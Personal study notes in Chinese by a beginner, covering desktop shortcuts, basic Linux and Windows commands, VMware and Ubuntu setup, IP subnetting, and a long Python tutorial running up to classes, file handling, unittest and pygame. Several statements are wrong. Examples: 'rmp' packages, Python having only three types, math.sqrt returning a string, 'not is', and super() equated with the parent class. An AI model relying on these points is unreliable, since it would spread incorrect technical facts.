'''1.Ctrl+Alt 是光标转换到主电脑。终端里ctrl+c是中止。PrtSc是截图快捷键，Alt+<-方向键是网页返回。
2.电脑图标加R是打开系统的程序，可以在里面删改和运行下指令。win+g是打开系统简易录制功能，win+l是锁屏。Ctrl+z是软件操作撤回。
3. sudo shutddown -r now 是立刻重启。reboot是立刻重启。init 6是立刻重启。shutdown -r 10过十分钟重启。shutdown是安全的关机。
4.Ctrl+Alt+T:打开Linux终端。win+shift+s就是截图。    Alt+F4：关闭当前界面       Alt+Tab是切换进程界面，win10功能应该是。F2重命名。
VScode中Ctrl+/就是多行注释与多行注释撤回。
5.常用操作命令(Linux)：只要命令和文件有关，就在命令后加一个空格再接文件。
                        1：df 显示磁盘使用情况。（disk(磁盘） free)            2：du  显示文件系统使用情况，文件磁盘使用空间（disk usage)     
                          3：ls  显示目录，(list(列表))  在桌面就显示       touch:是创建文件。   命令加 --help是查看使用手册的意思，
                             4：cd   切换工作目录（change directory)      5:  cp   复制（copy file(文件)）
                          6：pwd    显示当前工作目录（print work directory）      7:  mkdir    创建目录（make directory）或创建文件夹
                          8:   rm     删除文件  （remove file）    9：mv  移动（move file）    10： ln  链接（link  file）       
                          11：  stat  元数据（）      12：touch                                    13：  tar   解压文件（tape archive）
                          14：clear是清屏终端界面。     命令后面有[]括起来的是可有可无的选项，没有[]就是参数。选项是辅助操作。
                          15：Linux特有的查看手册是：man 命令。b是前翻一页，空格是后翻一页，Ent是后翻一小行
      Windows10常用命令：   1：win+R后输入mspaint打开画板。    write打开写字板（word）   calc打开运算器（各种功能）   
                            2：Shutdown -s -t 600：表示600秒后自动关机
                            3：shift加右键单击，打开的选项里有路径复制，和直接右键打开的不一样。
                            4：cmd后输入ipconfig显示电脑使用的IP地址。
                            5：cmd后输入systeminfo显示计算机的详细配置概述。
                            6：dir查看可打开文件夹，cd +文件名打开文件，start+完全文件名打开图形界面文件，cd..返回上一文件夹。
                                  copy con 文件名.txt创建文本然后输入内容，最后Ctrl+Z结束编辑。
6.下载VMwzre bools.(1)先在VMware点击下载bools,然后解压到桌面或者拖到home文件解压，然后打开终端，在终端中cd到解压后的文件里，最后 sudo ./vmware-install.pl 开始下载，遇到yes就打yes,其它的全部Ent直接装完。
7:装输入法配置：
先把网络连接方式改成桥接模式，然后改软件源，改完再下载语言安装包，用吴勇杰的方法，1： 先 sudo -1  2:  sudo -i   3: apt update  4:  apt install fcitx
        5: 安装语言包（控制中心，输入法，简体中文，安装包）6：sudo shutdown -r now  7:右下角小键盘设置改为拼音
8：下载谷歌浏览器：在内置浏览器搜chrome,然后选择正版下载，下载的安装包后缀是deb。下完后右键属性权限选择读写 读写 只读，允许安装程序。然后
  关闭右键双击，安装成功，在Rin那里下载程序可找到。
9：查看虚拟机是否分配到IP地址： ifconfig  ,然后出现有IP地址即可。有三个IP地址一起出现。
10：IP基础知识：IP是不直连主机间的通信。MAC是直连的两个主机间通信。在数据传送中，MAC与IP缺一不可，IP就等于虚的目标，定好了但是需要
实际行动，而MAC就是实际行动，IP始终不变，MAC在传输过程中一直变换源MAC与目的MAC，因为路由器这个中介一直在变，这个虚的目标就是网络层
是点对点的，MAC是数据链路层，是线的。           IP是以二进制表示的32位正整数，用点分十进制表示为，点分：32位分成四组，十进制：二进制换算成
十进制。最多2的32次方连接网络，就是43亿，NAT技术可以突破43亿连接数量，网卡可以设置IP，即可以看作IP。一个网卡可以设置多个IP。IP分为五类，
ABCDE 类，ABC类分为0，10，110，然后每类都有网络号和主机号，因为前面的设置所以IP地址有比0更小的上限和下限，然后每一类里主机号分别为
A 24位 B 16位 C 8位，主机个数为主机总数减二，二分别是主机号全为0和1。1是广播，0是某个指定网络（回环）。广播类型分为本地广播和直接广播，本地广播
是本地网址主机号全改为1，直接广播是把要发送的数据传到目标主机地址主机号全为1的IP ，D类用于组播，E类用于科研。子网是占用主机位形成的，可以
算入网络位里面，然后要配合子网掩码使用，子网掩码用二进制表示全部为0和1，用点分十进制则原网络位全为1，子网构成的网络位换算成十进制表示。
然后子网掩码可以掩盖（区分）好网络位和主机位。如：主机IP：202.112.14.137，子网掩码是：255.255.255.224，通过计算可得202.112.14.128为电脑网络
地址，即电脑网络地址等于IP地址二进制乘以子网掩码二进制，再转换成十进制，广播地址即在电脑网络地址基础上把主机位全部变为1.
11：打不开本地网页是多媒体编译器的问题，先  sudo add-apt-repository multiverse   再sudo apt update 最后
sudo apt install ubuntu-restricted-extras
12:下载python解释器，终端直接官网下载压缩包（自己改相应版本）： wget https://www.python.org/ftp/python/3.8.5/Python-3.8.5.tgz     然后解压  
     tar -zxvf Python-3.8.5.tgz    中断  原因：不用在Linux上面装。
13：Windows才用exe 后缀文件，Linux不用，Linux用rmp后缀。
14：code 中用Ctrl+Shift+x打开扩列。
15:安装VS code,然后先点倒数第二个扩展项，下载Chinese语言安装包，重启软件，然后再下python扩展，pylance,REST Client,Jupter Notebook,Jupyter Keymap
Jupyter,HTMLPlay,Docker,Debugger for Firefox扩展。然后打开文件夹，建一个文件，然后Ctrl+Shift+P打开选项板，输入Python:select inter下载解析器
，然后再文件>首选项>设置里工作区设置输入解释器地址（用于默认），然后文件夹里新建一个后缀是.py的文件，输入一个halloworld，调试，然后选择Python File,
然后弄出launch.json和settings.json文件在里面，然后完成，右下角文件类型选择python即可。可能还要在终端下载pip的什么两个插件。
16：python报错的单词比较单调，多查阅理解。python中，引号内是字符串，单引号双引号都是，引号里面可以灵活用引号和撇号，字符串之间可以用+来
拼接。python里操作的名词是方法，”.“代表执行，title是方法名称，方法后面要加一个（）表示额外信息，.title()    .之前写字符串名称。然后title是首字母
大写的方法，upper是全部字母大写的方法，lower是全部小写的方法。python是执行一行再执行一行来执行代码的。
17：制表符：\t (开头空出一段距离)  换行符：\n    去除字符串中的空白，去除右空白：rstrip()   去除左空白：lstrip() 去除左右空白：strip()  ，去除具有时效性
，除非去除后重新赋值，不然下下次输出会恢复空白。后面的是剔除函数，剔除空白。python2 中print有的不用括号有的要。制表符和换行符用在字符串里，
就算是print里也是用”“来连接。还不能直接输出汉字与数字
18：**两个乘号表示乘方运算，整形数字23在print里不是字符串，所以在字符串中表达可能会表达错误，用str(age)来避免。print只输出字符串应该是。
19：#是注释，python之禅:import this。"""多行注释"""。
20：name=['','','','','']这样创建列表，别忘了单引号，然后直接print是列表全部包括[]与''都显示出来，要[0]这样，可以输入[-1]是倒数第一个数据，依次-2，-3.
列表末尾添加元素，append('s'),任意位置添加元素insert(2，'c'）,完全删除元素 del name[2]  列表删除元素但还能提取name.pop(3)括号内无值默认末尾。
remove只删除一次指定的元素，且与pop功能差不多，.remove('').remove对象是列表。
21：列表内为小写字母开头，cars.sort()把元素变为按字母顺序排列(永久性)，cars.sort(reverse=True)按字母倒序排列（永久性），sorted(cars)按字母顺序排（表面显示，
实质未变）sorted(cars,reverse=True)按字母倒叙排列（表面显示，实质未变），cars.reverse()按原本顺序倒着来（永久性），len(cars)查看组内个数。
不要a=a.reverse(),这样无法打印出a,要a.reverse()，然后再打印a.这个reverse效果和切片a[::-1]差不多，一个原表会改变，另一个不会改变。
22：python 中几乎都不使用{}都是用缩进来代替{}。
for循环， for a in as: 冒号后缩进开始for循环的第一个执行语句，会自动缩进，一但不缩进即for循环结束。它是创建一个变量，然后把组内的内容一一
输入循环执行。python在print后会自动分行。（插件）range(1,11)是函数 直接创建1到10的数，1是起始数字设置，11是终止位置，第三个参数是
步长。和for循环用法为：for a in range(1,11):  list()是列表函数，range()左闭右开
list(range(1,11))直接表示创建了一个数表，令a=再print （a）就行了。(有效，但是range()里是用,隔开，和列表:隔开不一样) range(2,11,2)表示从2开始，
每次加上2，条件为<11。一种用法：squares=[]        for square in range(1,11):      squares.append(square**2)     print(squares)   简洁，与
设置一个变量等效。函数：min()max()sum()可用   range()里面是表示从多少到多少，所以可以从高到低反着来。
23：列表解析：等效于23的列表创建，表名=[执行语句 for 变量 in 数组]     s=[a**2 for a in range(1,11,2)] 
切片即取部分列表数据出来，用组名[:]来执行，:左右没有数字默认开头结尾。有差一现象，[1:3]是从第二个数据开始到第3个。复制数组用切片来进行，不能
直接用原数组赋给新数组，会导致改变一个数据两个一起变，用切片则是创建了一个副本，分开变。切片是前闭后开的。
24:python只有整型，浮点型，字符串类型。/python里得浮点数，//得整型。id（a）输出内存地址。#(''''''中间注释多行)。and or not 是python的三个
或与非。is ,not is是判断是否指向同一个内存地址。lst 列表(可变的数组)与tup元表(不可变的数组),改变：lst[1]=10。type()是输出变量的类型：tuple是
元组类型，list是列表类型.所以列表可变的是[]括起来的，()括起来的不可变。方法后面接的都是（）。dir(())或dir([])可以查数组或元组可用函数。
25：先更新pip，pip是python的第三方库，但是如果直接在终端更新慢的话，就换源更新。     pip install  -i https://pypi.tuna.tsinghua.edu.cn/simple
然后   pip install pip -U   更新完成然后直接  install jupyter   下载失败也是上网找，然后下完输入 jupyter notebook 打开，如果打不开，但是有网址
就复制网址打开浏览器去粘贴打开，另一个没有网址就先找到pip的exe文件地址，然后复制在RIN搜索操作系统环境变量，在path那行点击编辑，在里面新建一个，
粘贴即可。在重新在终端打开jupyter notebook即可。
26：元组更像是一个整体，想改只能重新命名一次列表。元组是只是一种列表，只是开头的（）表明身份，然后还是以列表的方式行事。而列表可以分割，个体也可赋
值.判断语句：==  not in  in  >=  <=  > < !=
都可以执行并给出一个true 或者false，可用and  or ,以上应该可以算是布尔表达式的一部分。
27：if elif else 像是一个多支分叉路口，符合条件只能走一个，想要符合条件又走多个，目前只能用多个if相接,是数值运算的要用int()来转换类型，不然运
算不了会出错。这种带有条件判断的要有缩进来区分是不是条件下的执行语句，如果没了缩进，就是主程序一部分，脱离条件执行。else可以省略。给一个值，在
用判断语句，程序自己会判断执行。 if与for 循环互相嵌套。
三目运算符：
为真时的结果 if 判断条件 else 为假时的结果（注意，没有冒号）
x = x+1 if x%2==1 else x
'%20' if c==' ' else c for c in s
28：遍历for套if就像是把班级里的同学挨个叫出来问符不符合条件。  
n for n in s:返回的是一个生成器对象，生成器对象是一个可以产生数据，可迭代的一个对象。
 除了使用生成器函数可以得到生成器，还可以生成器表达式得到生成器表达式。生成器表达式本身看起来像列表推到, 但不是用方括号而是用圆括号包围起来
生成器表达式就是上面这种类型。
list(n for n in s)是一个列表，或者a=n for n in s,a会变成列表，但是(n for n in s)或者直接打印n for n in s是生成器对象。
29:一个程序里尽量把命名部分和执行部分用一行空格隔开，这样好分辨，为以后写更复杂的代码打下基础。然后判断语句左右最好空一个格。
30：输出表中数据除了用[3]这种数字标签外，还可以用['ai']这种直接打印。
31：声明之后，字典大致当作列表用.字典用{}来声明身份，后面还是用[]来继续运行，字典里单位叫做键—值对，单位之间用，隔开，键—值对之间用：分开，值可以是数字，字符串，表，字典，可以
是python可以作为的对象。用字典名+键来返回值。往字典里添加键—值对：字典名['键名']=值，即可添加，不用insert函数。字典添加是不一定按顺序的。修改
字典键—值对：字典名['键名']=值，相应的键名只有一个，值名也是，键名应该都要加''。修改键—值对和添加键—值对的方式一模一样。多行字典缩进一致还有最
后一个数据加上,是为了规范理解。Tab键是缩进键。当列表或者字典里有数字而无法打印出来时，用str(列表/字典)来处理，就能输出数字了。
32：遍历字典，也用for语句，设置两个变量，因为字典里的单元都是两个变量的，然后执行一个.items()方法，是为了输出一个键列表和一个值列表, 
for key, value in user_0.items(): 。直接 字典名['键名']也可打开数据，输出的是值。修改字典键值对，重新对字典键赋值即可。用del删除。
in的对象是字典时，判断的是字典的键的列表。
这是根据结果需要显示两个变量的操作，如果是只需要显示一个变量就🆗的话，也可以设置一个变量再执行一个变量的方法，比如.keys(),是只输出所有键的。
.get('键')会返回对应的值。字典.get('')和字典['']的区别在于，当字典中没有对应的键时，get会返回None,不会报错，而['']会报错。
如果只设置一个变量不执行方法，默认输出所有键。有一些方法执行后会返回一个列表回来，比如.keys()
33:python里除了if与for嵌套，方法也可以嵌套的，还要可以只输出值的，.values(),对具有重复元素的列表使其只剩下不重复元素的：set(字典)。
学会使用遍历来创建多个列表和字典，与填充内容，然后用切片来处理组例。列表里可以放字典，字典里也可以放列表，把值改为列表即可，同理，放字典的时候
也可以字典套字典。打开的话用 名字[][]形式，字典列表：字典名['键'][索引]   列表字典：列表名[索引]['键']
34：shell是命令执行环境，那个黑窗口就是。未声明的变量不能执行方法或函数。for循环更多是按顺序去遍历，while 更多是按存在去遍历。
35:a=input("")是输入字符串，()内可以先打印出提示，相当于c++里先cout提示再cin，input（）需要在终端界面里输入，在编码界面按运行。要用int(a)来转换
字符串为整型，%:求模运算符（取余）
36：while循环也是：后面缩进的都是循环执行语句，然后退出方法可以用break也可以用设置一个输入，当输入是指定的特殊字符串时退出循环。break是所有python
循环都可以使用的语句， 和C++一样直接打break就好。continue语句是忽略余下的语句进行下一次循环，余下的语句与continue不是在同一缩进里。在列表之间
移动元素，像c++一样设置一个中间变量即可。消除元素用remove('')即可，消除特定值，判断是否还有某个元素用in就好，现在利用已知学的这些内容可以让用户
输入打印一个数据比较完整的字典出来了，而且还可以分好类，像一个超级简单的表格。
while和else也可以进行搭配，非while条件就执行else条件。
37:print自带换行功能，用help(print)可以查到print的函数代码，把里面的end参数含义由'\n'改为''或者空格即可消除换行，具体为print(a,end='').
37：函数即方法，存在模块里，用def来命名：def main():冒号后缩进皆为函数体，括号里是参数，单独用函数可以直接打出函数使用，main()参数位置输入相应
值即可。()内是信息传递的地方，实参输入形参中。形参不用加''，输入参数：位置实参（位置关系一一对应），关键词实参（键—值对），在形参处设置等于一个
值即可设定形参默认值，默认值用'' 括起，再把它移动到后边，因为平常输入的实参都是按顺序输入形参中的，除非用关键词实参，否则不按顺序，默认值无效。
在函数末尾加个return ,即可让函数返回一个值，a=调用函数(x)，值将返回到a里。让参数变成可选的就是在默认参数基础上加了个判断，然后分开执行。括号里
是形参，所以在函数体里不能添加形参，函数只是返回输出函数体里给的值，而不是函数头，所以一般是在函数体里再建一个新表，在新表里操作。字典添加单位
与表添加单位不一样，字典添加单位就像表改变元素值一样形式。给函数输入一个列表用一个中间变量即可。
函数形参里的/表示之前的形参用位置形参的方法，*之后的形参用关键字形参的方法，中间的形参无要求。def test(a:int, b:str) -> str:像这种，形参后面
的为推荐使用的数据类型，非推荐数据类型也可以使用但是会提示，后面的->表示返回值的数据类型，然后再:
全局变量和局部变量名相同情况下：主函数中赋值局部变量无错，其它函数中赋值局部变量就要先声明一下全局变量global a；然后再赋值。
38：import math      math.sqrt(x)   x=   根号函数,输出的是字符串，要str()转换。    while 的True 必须是大写开头。
39：函数里设置隐藏参数一定要等于''，age=''这样，就算没输入age,输出那里也不会打出age的信息，隐藏参数设置在形参括号里，不是函数内。但是如果设置
了age没有'',那就会报错，因为没输入实参
实参一般不能多余或少于形参，所以用=''可以有效避免尴尬.if age:  a['age']=age.输入实参是字符串型应该要用''的.while应该不能遍历，网上搜的。
输入列表实参，把函数设置成专门为列表做的。切片表示法创建副本，让函数改变的全是副本，而不是原件，能够在函数之后还能打印原件内容。如果实参数量
大于形参，还要让形参统一处理，在形参前加*号。如果不是同一个种类，那就把*形参放到另一个形参后面，这样第N个默认位置实参，多出的都算任意数量实参
或者直接用关键字实参，*的实参都放进同一个元组里(自动创建的元组)。两个**表示创建一个空字典，并把实参中的键值对都放入进来，实参的键值对
形式用=不是：（存疑)     键值对实参形式：color='blue'     一个函数形参只能放一个*和一个**
40:扩展名为 名字.py的文件就是模块，模块内只放函数，数量任意。然后创建新文件，在文件里用import 名字 导入模块，再用 名字.函数()打开
函数使用。只导入函数，from 文件名字 import 函数，函数，函数 即可导入任意数量函数。这种只导入函数的指定函数使用即可，不用再.函数。用as可以起函数
别名：from  文件  import 函数 as  别名  用 import 文件 as  别名 也可对模块起名  导入所有函数用* ： from 文件 import *  用from的导入都不用
句点表示法来使用函数。from 直接文件名就行，不用写文件的类型也不用加""或<>
41：形参隔行要缩进两次，和函数体区分。import 语句应放在文件开头。
42:print(str()+str())只能字符串与字符串拼接，错误类型为can only concatenate str (not "int") to str。还要input输入的是字符串，用运算符记得改为
整型。
43：编写类：class 类名():  类名使用驼峰命名法，首字母大写，里面的函数和实例名模块名用小写，首先创建一个函数，def __init__(self,x,y)然后用self
做前缀，作用：初始化属性变量，个人认为在类内用属性是用self.的类外部用是不用带self的，直接用即可。类名括号里加的其他类名，是父类名，类内第一个函数
self之后的参量都是初始化数据。其它函数括号内都要填self，代表类内任意以self为前缀的属性都可用。然后类内函数内部用什么形参都准确设计好了，这样在
类外用函数时，直接.函数名它自己会寻找。就像类外的数据在类内被复制包装。类内属性值也可以和函数形参一样默认，修改属性值有三种方法：一：类外直接
点名道姓=修改值，二：类内用函数修改为任意值，三：类内用函数修改为特定值。创建子类时，__init__(self,,,)首函数要把所有父类属性重新初始化，所以：
执行super().__init__(self,,,)super()是父类的意思，父类执行父类的首函数。在子类和父类函数名重名的时候，执行子类的函数。输入时会产生一个属性，
__init__会返回一个实例。访问实例时，打印才需要.出属性，执行函数不需要.属性，实例直接执行。my_dog.roll_over()         前
print("My dog's name is " + my_dog.name.title() + ".")          后
 用类时先让变量=类名( ，)应该是为了创建一组利用类形成的实参，以便和多次使用类的其它组区别开来。__init__是方法。
44：类名的下一行应该注释类的作用，导入类和导入函数一样，先放进一个模块里，from  模块  import  （类/*/类，类） ，  模块random中randint函数可
返回一个指定范围的任意值。self一个相当于类内的一种索引，所以函数形参只用self即可，其它不用而在函数内还能继续用。类中函数叫方法。类外叫函数
randint函数是前闭后闭的，random.randint(1,100)

类补充：__init__()函数应该类似于构造函数，__del__()类似于析构函数，py文件执行完毕自动执行析构函数，或者del手动执行对象释放。self是类的实例化对象，可以用del来删除类的属性和对象，del p1.age，del p1
 def __init__(self, fname, lname):
    super().__init__(fname, lname)

保护属性
_foo：以单下划线开头的表示protected（保护）类型的成员，只允许类本身(实例)和子类进行访问
私有属性
__foo：以双下划线开头的表示私有类型的成员，不允许实例进行访问。

isinstance(对象名，类名)用来检查某个对象是不是某个类的实例。

45:打开文件：用with open('文件名') as 变量 ：意思是open() 是一个打开文件函数，并用as把文件变成返回值赋给变量，但是此时变量不可打印要重新赋给另
一个变量才行，with是把打开文件后关闭文件的权限给python，因为自己来判断文件关闭，判断不准确的话会对文件数据破坏(书上说的)交给with给python判断
即可。所以close()也是一个函数。打开文件只能打开在当前程序所在的同一个文件夹内的文件，不能在文件的子文件夹里，必须打开到最后。要打开不直接在同一
个文件夹的文件，用相对文件路径或绝对文件路径即可。相对文件路径：要求文件在程序所在文件夹的子文件夹内，用open('子文件夹/文件名')来打开。绝对文件
路径：open('某盘/某文件夹/某文件夹/某文件夹/某文件')根据不同操作系统有不同名称，因为绝对路径比较长通常先把它赋予一个变量，在open那个变量好了。
with中包含多个项
with open('1.txt') as f1, open('2.txt') as f2:
 
with     as a：字句使用的是上下文管理器，上下文管理器是指在一段代码执行之前，执行一些预处理的工作，代码执行之后再执行一些清理工作。
简单来说，上下文管理器的原理过程如下：
调用__enter__()方法，进行预处理操作
执行用户操作
调用 __exit__() 方法，完成清理操作
根据上下文管理的原理,上下文管理器的原理是实现了__enter__()和 __exit__() 这两个方法,所以我们可以根据此原理来自定义自己的上下文管理器。
当with中执行的语句发生异常时，异常信息会被发送到 __exit__()方法的参数中， __exit__() 方法有如下三个参数:
exc_type : 异常类型
exc_val : 异常值
exc_tb : 异常回溯追踪
这三个参数都与异常有关，with语句会把异常的exc_type ,exc_val 和exc_tb传递给 __exit__() 方法，它让__exit__() 方法来处理异常 ，如果__exit__()返回的是True，那么这个异常就被忽略，并按照我们定义的方式进行抛出。如果__exit__()返回的是True以外的任何东西，那么这个异常将被with语句抛出。
class MyOpen(object):# object是所有类的父类，不写便是默认object
    """自定义上下文管理类"""

    def __init__(self, file, mode):
        self._file = file
        self._mode = mode

    def __enter__(self):
        self._handle = open(self._file, self._mode)
        return self._handle

    def __exit__(self, exc_type, exc_val, exc_tb):
        # print('Type: ', exc_type)
        # print('Value:', exc_val)
        # print('TreacBack:', exc_tb)
        self._handle.close()
        print("异常已被处理")
        return True

# 读的模式打开文件,进行写操作，不支持
with MyOpen('123.txt', 'r') as f:
    f.write('python')
    
输出：
异常已被处理
注意：__exit__()的参数必须四个都写上，不然报错
46：上面打开文件，就算是只读模式也要用.read()函数读取文件。.read()是把字符变成一个字符串输出，所以用for循环在.read()前面会得到一个一列
一字的打印。for循环和read函数差不多，区别应该就在于一个单个字符串，一个不知道是什么。for 就是加强版的readline,每行都读取，读完。
.readlines()按每行为字符串包括换行符在内整个文件变成列表。.readline()是只读取第一行输出字符串，(6)表示读取第一行的前六个字符或字节。
要一行行读取文件时，for循环默认一行行读取，直接放在原本变成字符串赋予变量的位置即可，一行行读取文件会有默认换行符，在打印里用rstrip()消除。
因为直接打印打印语句也有换行符。但是第一个变量存储的是文件及其内容。
变量=对象.readlines()是把文件每一行变成'字符串+\n'放进列表作为一个整体存储在一起，直接打印则显示一个列表，可用for循环打开，显示时自动翻译换
行符，用.rstrip()消除。
for循环是只要对象包含有多个数据应该都可以用，就算数据在列表内，在字典内。with打开的文件在with代码块范围内保持打开，可以访问，但在with代码范围
外无法访问，所以才在范围内存储位一行行列表，是为了在范围外继续使用，所以范围内直接打印不用赋予变量。
47：float(变量)转换成浮点数。在范围外打开后可以用方法把列表变为原本数据形式存储在变量里，比如可以用for循环，然后每个用.(r)strip()把它+=某个
空变量即可。in 用法：查看某个特定数据是否在某个东西内。.replace('目标名'.'变换名')可把字符串内或表内特定字符变位希望变换的字符。
48：写入文件：在open()打开函数的参数内多添加一个参数，可选择打开模式：'w'(只写入),'r'(只读),'r+'(读写),'a'(附加)，默认只读。写入只能写入字符串
，所以要把想写入的数据用str()转换后再写入，写入用.write('')来写入，写入会把之前的东西删除，只留下python里写入的东西。而读写和附加模式才会不删除只添加
。写入的字符串不会自动处理，要自己加换行符，空格等。打开文件才要把文件名和文件类型全部写上。
49：traceback:错误信息报告，是python自带的，会透露一部分程序信息，比如一行代码，文件名等，如果客户是攻击者，可根据这一点发起攻击。所以用
try-except代码块来避免出现traceback报告给客户，而是显示希望客户知道的内容。并且try-except代码能够在出错误的情况下打印except内的内容，然后执行
剩下的语句。在执行可能出现错误的代码时，把代码转移到try中：
try:     执行代码      except  错误类型：  print('希望显示的信息')     else:  print('正确的信息')     （else： 可有可无）
except：后面用pass代表错误下什么都不做，忽略。
现在错误类型有（根据客户可能出现的来提前写）：ZeroDivisionError除零错误，FileNotFoundError文件不存在错误
Exception as e
这个将会捕获除了 SystemExit 、 KeyboardInterrupt 和 GeneratorExit 之外的所有异常。 如果你还想捕获这三个异常，将 Exception 改成 BaseException 即可
50：.split()函数是以空格为分隔符把一个字符串分成多个小字符串并放在一个列表的函数。 try-except称为异常处理块。.count('单词名')
寻找特定单词出现次数，前面变量用.letter()可以避免大小写而漏掉的情况。
51:程序之间共享数据的简单方式，json模块，dump与load函数，一个存储一个读取，函数()内第一个参数是要存储的数据，第二个参数是存储的文件。load只能读取
文件中的一个对象，多了读取不了，解决办法有：1，把文件的多个对象变成一个列表，即一个对象，2，逐行（个）读取对象
函数重构指为了使函数更清晰明了，把单个但是复杂的函数变为多个简单清晰的函数。
dir()查看相应方法
52:遍历中想改变列表，一：定义一个新列表，把处理过的给新列表，然后把新列表赋给旧列表。二：遍历一个切片，列表切片和原列表地址不同，所以切片不变，
而执行对列表的操作，列表改变，如果不是对切片，对原列表的话，i在递增，而表又在变换，就会跳过一些数据。三：利用逻辑if判断来避免它。
53:print(a.name)打印变量.对象名可以得到实例结果。类中的形参和对象名不能同。类直接输实参用""字符串形式。.items()方法返回的是一个元组列表
sorted(a)函数返回的是一个列表，sorted是对字典作用按ascII码从小到大排序的.对字典只用.items()是把字典的键值一对对放进元组，再组成列表的，如果
定两个变量来遍历，才会分开成键一个列表，值一个列表。.keys().values()返回的也是列表，但是不知道怎么打开。
54：文件r的模式打开，不存在文件会报错，但是以w或a打开的文件不存在会创建一个新文件。打开模式中后面的b是binary二进制的缩写，以二进制模式打开的意思。
open只是打开文件，而read函数才是读取文件。读取txt文件时无法打开，'gbk' codec can't decode byte 0xab in position 34: illegal multibyte 
sequence出现解码错误，在open(,encoding='UTF-8')加上后面的那串即可，声明python代码的文本格式是utf-8编码，encoding是编码的意思
replace是字符串的方法不是列表的方法,且是暂时的，不会一直变，打印的时候用就得了。print str.replace("is", "was", 3)，3是替换次数。
55:测试案例要把函数放在一个模块内，再在新程序里导入两个模块，一个是函数那个，另一个是python测试案例的unittest模块。然后要创建一个类，必须包含子类
unittest.TestCase.首函数不用init，直接创建测试用例的函数，名字必须test_开头，把测试函数返回值存入一个变量，然后调用unittest模块的测试方法
assertEqual,形参分别是测试函数返回值和正确值。self.assertEqual(formatted_name, 'Janis Joplin') 顶格写代码行unittest.main()让Python运行这个
文件中的测试。看结果改正即可。python变量也有作用域的属性。
56：模块和文件类型不一样。一个对象应该就是一个类。unittest。TestCase类里有方法setUp(),子类中使用它时，将先运行它再运行其它的方法，它用来创建
一个调查对象和测试答案列表和测试实例,也是只有一个形参。方法形参必须有self但不限于self。
   assertEqual(a, b)       核实a == b
   assertNotEqual(a, b)    核实a != b
   assertTrue(x)           核实x为True
   assertFalse(x)          核实x为False 
   assertIn(item, list)    核实item在list中 
   assertNotIn(item, list) 核实item不在list中 
57：d=dict()等同于d={},都是创建字典的方式。类的（）是接父类，而类名后面的__init__是定义形参，给予对象的操作而已，毕竟一个类，一个函数可以没有
形参，但是仍然可以调用。
58：在visual studio code里可以正常使用pygame.我下载还是用了：pip install pygame
dir是查看所有属性和方法的，help():import math      help(math)
59:创建游戏：首先导入两个模块：sys和pygame，pygame包括开发游戏所需要的功能，sys模块是用来退出游戏的。为使pygame正确地工作，用pygame.init()
初始化背景设置。然后screen=pygame.display.set_mode((1200，800))创建一个名为screen的显示窗口，游戏的所有图形都将在其中绘制，1200，800像素是窗口
大小，用元组来输入。screen是对象，为surface（操作台），pygame里操作台是屏幕的一部分，是整个游戏窗口，单独每个元素外星人，飞船等都是surface，激活
游戏动态循环后，每一次循环都自动重绘surface。while循环控制事件循环（指玩家进行的操作和以后的if判断来执行）和屏幕更新（刷新一个新窗口，并擦去旧
窗口），pygame.event.get()用于检测事件，事件pygame.QUIT指关闭窗口的操作，会调用set.exit()退出游戏，屏幕更新用pygame.display.flip().
游戏开始主循环的调用是run_game()       可以不建立对象，直接使用类中的方法。但是要点名哪个模块哪个类中哪个方法。
60：pygame中颜色由RGB值确定，RGB由红绿蓝组成，每种颜色范围是(0，255)，使用方法是(255,0,0)表示纯红，先定义颜色，然后用pygame.fill()来填充屏幕。
在子类中创建一个对象，父类不会创建，但是可以调用父类的构造方法（即也有父类的属性方法），看起来像是构造了一个对象一样，实际在于没有为父类开辟存
储一个新空间。往父类构造方法里传递了子类对象地址。基类是父类，派生类是子类，派生类可以使用基类的方法，基类对象不能使用派生类方法，子可用父，父
不可用子。
61:pygame默认加载位图，可以将不是位图的通过一些软件变成位图再在pygame加载或者配置pygame使用其它类型的图片，有些图片会要求下载图形库软件。位图
.bmp , 然后新建一个模块，用来处理飞船图片，模块里面引入pygame模块，然后新类，用方法pygame.image.load('相对路径/绝对路径文件.bmp')下载并赋予
属性image，pygame中image是一个类，方法get_rect()读取属性(即公共变量)赋予到rect属性里，get_rect()是一个处理矩形图像的方法，返回值包含矩形的居
中属性（ center centerx centery ），得到一个抽象矩形模型，具有坐标的位置属性，可以赋值改变位置，坐标是以左上角为(0.0)右下角为(∞.∞).
blit函数使用主体是屏幕，第一个参数是显示的图片，第二个是位置。
62:一定程度后进行函数的重构，重建一个模块game_functions，分别把管理事件的代码和控制屏幕更新的代码放到新函数里check_events() 和update_screen() 
再把游戏主循环的代码更正，让代码更整洁，结构更清晰。
63：开始对游戏进行动态设置，这个添加一个检测事件输入是否为右按键即可，是就把图像属性加一，但是这是单一检测，不支持按住不动的事件使动态移动。
pygame把按右键分割成按和松开两个状态（默认，猜测），然后只需在ship对象里设置一个新属性赋值False，检测到按住右键，再赋值为True，再类里检测到True
执行图像横坐标属性+=1的方法，再检测到松开，重新赋值为False，类里重复检测到再停止方法。就是单向动态检测的完整版了,同样操作弄个左键的即可。因为
centerx的属性只能接受整型数据，要提高灵敏度，就新建一个可以接受小数的属性来代替centerx，在settings里新建一个速度属性，然后在飞船ship里使用这
个速度，新弄两个属性，一个是存储ai_settings的信息，另一个是代替centxerx的center属性，并赋值float(centerx)的值，然后把update方法里的+=1改成
ai_settings属性对应的值，左键的也相应更改，等式左边改成center，最后把center的值重新赋给centerx即可。但是这个是直接把速度改成加减固定值，不是
判断条件，没有到了条件再改变速度的功能。update里设置一个if限制判断飞船的位置不超出屏幕的位置范围,这里让centerx的范围是图片矩形中心的范围，图片
会有一半超出范围，让rect.left和rect.right才是图片的左边和右边不超出范围，图片全部在屏幕内。
64：重构函数check_event的检测按键函数。然后添加子弹功能。
类的补充：类的初始化都是__init__().因为子类也有__init__(),会重载函数，所以在子类想继承父类的初始化，就要用super().__init__(),没有应该就不用
super(Dog,self)=super()=Animal(父类),self会首先调用自己的方法或者属性，当自身没有目标属性或方法时，再去父类中寻找；super会直接去父类中寻找目标
属性或方法。对于类的属性，self.a1必须赋值，这样sprint(实例.a1)才有输出，无论是类中直接赋值self.a1还是self.a1=a1都行。
无论是私有属性还是私有方法，在类外面都无法访问，私有属性只能在类中用类的方法访问，私有方法只能由类的方法来调用。在self.__a1与def __a()来表示私有
两个下划线。子类不能继承父类的私有属性和方法。单下划线表示保护型数据，只能本身类与子类使用。
当class a(b,c)的时候，可以看作a是b的子类，b是c的子类，调用方法时，使用b中重载的方法，而不是c，
